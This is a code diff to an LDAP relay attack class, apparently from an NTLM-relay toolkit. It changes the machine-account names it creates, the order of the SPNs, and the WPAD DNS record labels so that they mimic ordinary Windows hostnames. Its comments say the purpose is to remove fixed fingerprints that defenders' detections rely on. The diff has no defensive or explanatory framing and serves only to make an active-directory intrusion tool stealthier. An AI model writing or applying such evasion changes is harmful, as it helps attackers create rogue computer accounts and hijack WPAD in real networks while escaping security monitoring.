@@ -146,8 +146,12 @@ class LDAPAttack(ProtocolAttack):
 
         computerName = self.computerName
         if not computerName:
-            # Random computername
-            newComputer = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
+            # Match the variable-length DESKTOP/LAPTOP-style names Windows uses
+            # rather than a fixed 8-letter uppercase pattern.
+            prefix = random.choice(['DESKTOP', 'LAPTOP', 'WIN', 'PC'])
+            suffix = ''.join(random.choice(string.ascii_uppercase + string.digits)
+                             for _ in range(random.randint(7, 11)))
+            newComputer = '%s-%s$' % (prefix, suffix)
         else:
             newComputer = computerName if computerName.endswith('$') else computerName + '$'
 
@@ -161,13 +165,15 @@ class LDAPAttack(ProtocolAttack):
         computerHostname = newComputer[:-1]
         newComputerDn = ('CN=%s,%s' % (computerHostname, parent)).encode('utf-8')
 
-        # Default computer SPNs
+        # Default computer SPNs (order randomized so the four-SPN sequence
+        # is not a fixed fingerprint).
         spns = [
             'HOST/%s' % computerHostname,
             'HOST/%s.%s' % (computerHostname, domain),
             'RestrictedKrbHost/%s' % computerHostname,
             'RestrictedKrbHost/%s.%s' % (computerHostname, domain),
         ]
+        random.shuffle(spns)
         ucd = {
             'dnsHostName': '%s.%s' % (computerHostname, domain),
             'userAccountControl': 4096,
@@ -862,7 +868,12 @@ class LDAPAttack(ProtocolAttack):
 
         if is_name_wpad:
             LOG.info('To add the `wpad` name, we need to bypass the GQBL: we\'ll first add a random `A` name and then add `wpad` as `NS` pointing to that name')
-            a_record_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
+            # Use a Windows-host-style label (DESKTOP-XXXX) with variable
+            # length to avoid the fixed 12-letter lowercase fingerprint.
+            label_suffix = ''.join(random.choice(string.ascii_uppercase + string.digits)
+                                   for _ in range(random.randint(7, 11)))
+            a_record_name = ('%s-%s' % (random.choice(['DESKTOP', 'LAPTOP', 'WIN', 'PC']),
+                                         label_suffix)).lower()
 
         # First add an A record pointing to the provided IP
         a_record_dn = 'DC=%s,%s' % (a_record_name, dns_base_dn)
